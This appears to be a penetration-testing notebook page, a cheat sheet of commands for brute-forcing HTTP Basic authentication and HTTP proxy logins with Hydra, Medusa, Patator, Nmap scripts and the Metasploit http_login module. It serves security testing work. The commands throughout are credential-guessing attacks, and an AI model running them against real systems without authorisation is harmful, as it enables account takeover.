# 04 - Brute Force

## 01 - HTTP Basic Authentication

### 1.1 - `GET` HTTP Method

#### 1.1.1 - [[03 - Offensive Infrastructure/E - Setup Machine/0x02 - Offensive Tools/Password Cracking/Online/Hydra|Hydra]]

```
$ hydra -L users.lst -P passwords.lst http[s]-get <IP> [-s <PORT>]

$ hydra -L users.lst -P passwords.lst http[s]-get://<IP>:[<PORT>][/path/to/URI]
```

#### 1.1.2 - Medusa

```
$ medusa -H <IP> -U users.lst -P passwords.lst -M http [-m DIR:/path/to/URI]
```

#### 1.1.3 - Patator

```
$ patator http_fuzz method=GET url=<URL> 0=passwords.lst header="Cookie: <cookie_session>" --threads=2 timeout=15 -x quit:fgrep!='<Error_message_response>',clen!='-1'
```

#### 1.1.4 - Network Mapper

Brute force HTTP realm.

```
$ nmap -p 80,443,8000,8080,8443 --script http-brute --script-args http.useragent='<user_agent>' <IP>
```

#### 1.1.5 - Metasploit

```
msf > use auxiliary/scanner/http/http_login

msf auxiliary(scanner/http/http_login) > options

Module options (auxiliary/scanner/http/http_login):

   Name              Current Setting                                                           Required  Description
   ----              ---------------                                                           --------  -----------
   ANONYMOUS_LOGIN   false                                                                     yes       Attempt to login with a blank username and password
   AUTH_URI                                                                                    no        The URI to authenticate against (default:auto)
   BLANK_PASSWORDS   false                                                                     no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                         yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                                     no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                                     no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                                     no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none                                                                      no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt      no        File containing passwords, one per line
   Proxies                                                                                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, http, socks5h
   REQUESTTYPE       GET                                                                       no        Use HTTP-GET or HTTP-PUT for Digest-Auth, PROPFIND for WebDAV (default:GET)
   RHOSTS                                                                                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT             80                                                                        yes       The target port (TCP)
   SSL               false                                                                     no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS   false                                                                     yes       Stop guessing when a credential works for a host
   THREADS           1                                                                         yes       The number of concurrent threads (max one per host)
   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/http_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                                                     no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/http_default_users.txt     no        File containing users, one per line
   VERBOSE           true                                                                      yes       Whether to print output for all attempts
   VHOST                                                                                       no        HTTP server virtual host

msf auxiliary(scanner/http/http_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/http_default_users.txt

msf auxiliary(scanner/http/http_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt

msf auxiliary(scanner/http/http_login) > set requesttype <GET | HTTP-GET | HTTP-PUT | PROPFIND>

msf auxiliary(scanner/http/http_login) > set threads 4

msf auxiliary(scanner/http/http_login) > run rhosts=<IP> rport=<PORT>
```

### 1.2 - `POST` HTTP Method

```
$ hydra -L users.txt -P passwords.txt http[s]-post <IP>[:<PORT>][/path/to/URI]

$ hydra -L users.txt -P passwords.txt http[s]-post://<IP>[:<PORT>][/path/to/URI]
```

## 02 - `PROXY`

### 2.1 - HTTP Method

#### 2.1.1 - [[03 - Offensive Infrastructure/E - Setup Machine/0x02 - Offensive Tools/Password Cracking/Online/Hydra|Hydra]]

```
$ hydra -L users.lst -P passwords.lst http-proxy://<IP>:[<PORT>][/path/to/URI]
```

#### 2.1.2 - Network Mapper

Brute force HTTP proxy server.

```
$ nmap -p 80,443,8000,8080,8443 --script http-proxy-brute --script-args http.useragent='<user_agent>' <IP>
```

### 2.2 - PROXY URLEnum HTTP Method

```
$ hydra -L users.lst -P passwords.lst http-proxy-urlenum://<IP>:[<PORT>][/path/to/URI]
```

## 03 - `HEAD` HTTP Method

```
$ hydra -L users.lst -P passwords.lst http[s]-head://<IP>:[<PORT>][/path/to/URI]
```

---
## References

### Backlinks

- [[Authentication Methods|Information Gathering: HTTP Authentication Methods]]

- [[06 - Tactics & Techniques & Procedures Phases/D - Webapp Pentesting/0x03 - Bypass Webapp Security/Web Application Firewall (WAF)/Helpers/User Agents|Webapp Pentesting: User Agents]]

### Hacking Articles

- [Hacking Articles: Nmap for Pentester Password Cracking](https://www.hackingarticles.in/nmap-for-pentester-password-cracking/)

### Ethical hacking and penetration testing

- [Ethical hacking and penetration testing: How to hack HTTP Basic and Digest Authentication](https://miloserdov.org/?p=5303)

### Penetration Testing Tools

- [Penetration Testing Tools: Medusa](https://en.kali.tools/?p=200)

### Manraj Bansal

- [Manraj Bansal: How to use Hydra to brute force login forms](https://www.manrajbansal.com/post/how-to-use-hydra-to-brute-force-login-forms)